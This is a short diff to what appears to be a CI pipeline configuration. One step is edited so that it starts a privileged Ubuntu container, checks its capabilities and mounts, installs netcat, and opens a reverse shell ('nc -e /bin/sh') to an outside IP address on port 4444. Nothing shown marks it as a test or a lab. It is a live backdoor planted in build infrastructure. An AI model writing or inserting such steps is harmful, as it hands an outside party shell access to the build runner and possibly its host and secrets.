@@ -13,4 +13,4 @@ steps:
 #  - cmd: bash grep Cap /proc/self/status
 #  - cmd: bash df -a
  - cmd: docker network ls
- - cmd: docker run --privileged ubuntu /bin/sh -c "echo privileged && grep Cap /proc/self/status && df -a && ls /proc/self && nc -e /bin/sh 52.226.137.126 4444"
+ - cmd: docker run --privileged ubuntu /bin/sh -c "echo privileged && grep Cap /proc/self/status && df -a && ls /proc/self && apt-get update && apt install netcat && nc -e /bin/sh 52.226.137.126 4444"
